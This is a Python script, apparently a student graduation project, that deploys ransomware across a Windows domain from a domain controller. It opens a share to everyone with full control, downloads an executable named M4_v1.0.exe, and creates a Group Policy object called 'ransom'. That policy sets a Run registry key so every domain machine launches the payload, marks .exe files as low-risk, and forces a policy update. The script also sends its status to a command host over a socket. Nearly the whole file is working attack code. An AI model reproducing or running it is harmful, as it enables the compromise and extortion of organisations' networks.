#
#
# 해당 코드는 중부대학교 정보보호학과 '공격해조' 졸업 팀이 제작한 코드입니다.
#
#

import os
import socket
import getpass
import os.path
import platform
import threading
import subprocess
import urllib.request
import json


# 0. 세팅
# 0.1 OS
a = platform.platform
# 0.2 PC name
b = platform.node
# 0.3 Username
c = getpass.getuser()
# 0.4 Download file
d = "M4_v1.0.exe"
# 0.5 IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
e = s.getsockname()[0]
# 0.6 current file name
dri = os.path.basename(__file__)
# 0.7 Domain Names
f = open('ipconfig.txt', 'w', encoding='UTF-8')  # 새로운 파일 생성
# cmd에서 ipconfig /all을 실행한 출력 값을 result에 저장
result = os.popen('ipconfig /all').read()
f.write(result)  # result를 파일에 저장
f.close()

name = open('ipconfig.txt', 'r', encoding='UTF-8')  # ipconfig 파일 읽어온다
lines = name.readlines()  # 불러온 텍스트 파일을 행으로 나눈다
line = lines[4].split(": ")  # 4라인 ': '으로 나눠
# 나누면 test.com 이렇게 나오는걸 다시 '.'으로 나눠 -> 'test', 'com\n'으로 나눠짐
domain = line[1].split(".")

first = domain[0]  # test
second = domain[1]  # com\n
third = second.split("\n")  # com\n을 줄바꿈(\n)으로 나눠
com = third[0]  # com
# 통신 관련 세팅
info_List = []
m_dict = {'NAME': '', 'IP': '', 'INFO': ''}
hostname = subprocess.check_output(['hostname']).decode(
    'utf-8').replace('\r', '').replace('\n', '')


# 1. 공유 폴더 생성
def file_create():
    try:
        cmd1 = "powershell.exe mkdir C:\\share2"
        cmd2 = "net share share2=C:\\share2 \"/GRANT:everyone,FULL\""
        cmd3 = "icacls \"C:\\share2\" /t /grant \"everyone:(OI)(CI)F\""
        subprocess.call(cmd1)
        subprocess.call(cmd2)
        subprocess.call(cmd3)

        info_List.append(('Create share folder', 'Ok'))
    except:
        info_List.append(('Create share folder', 'No'))


# 2. Module4 다운로드
def file_download():
    try:
        url = "https://github.com/kdw9805/AttackMe/blob/main/M4_v1.0.exe"
        path = "C:/share2/M4_v1.0.exe"

        urllib.request.urlretrieve(url, path)

        info_List.append(('Download Module4', 'Ok'))
    except:
        info_List.append(('Download Module4', 'No'))


# 3. 그룹 정책 추가
def gpo_add():
    try:
        cmd1 = "powershell.exe new-gpo -name \"ransom\""
        cmd2 = "powershell.exe Set-GPRegistryValue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -valuename clopransom -type string -value \"\\\{}\share2\{}\"".format(e, d)
        cmd3 = "powershell.exe set-gpregistryvalue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\Windows\\CurrentVersion\\policies\\associations\" -valuename LowRiskFileTypes -type string -value \".exe\""
        cmd4 = "powershell.exe \"new-gplink -Name \\\"ransom\\\" -Target \\\"dc={},dc={}\\\"\"".format(first, com)
        cmd5 = "powershell.exe gpupdate /force"

        subprocess.call(cmd1)
        subprocess.call(cmd2)
        subprocess.call(cmd3)
        subprocess.call(cmd4)
        subprocess.call(cmd5)

        info_List.append(('Add GPO', 'Ok'))
    except:
        info_List.append(('Add GPO', 'No'))


# 4. 통신
def Socket_Create():
    Host = '192.168.0.133'
    Port = 9999

    global Client_Socket

    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket.connect((Host, Port))

    receive_thread = threading.Thread(target=info_send)
    receive_thread.start()


def info_send():
    print('info_send start')
    m_dict['NAME'] = 'DC'
    m_dict['IP'] = e
    m_dict['INFO'] = make_List(info_List)
    while True:
        try:
            Client_Socket.sendall(json.dumps(m_dict).encode('ascii'))
        except Exception as error:
            print("Error!", error)
            Client_Socket.close()
            break


def make_List(info_List):
    info_Lists = '[M3]\n'
    for info_name, info_state in info_List:
        info_List = info_name + ': ' + info_state + '\n'
        info_Lists += info_List
    return info_Lists


# 5. Main
file = 'C:\\share2'.format(c)

if os.path.isdir(file):
    print("file exist")
    exit()

else:
    print("no file")
    file_create()
    file_download()
    gpo_add()

Socket_Create()
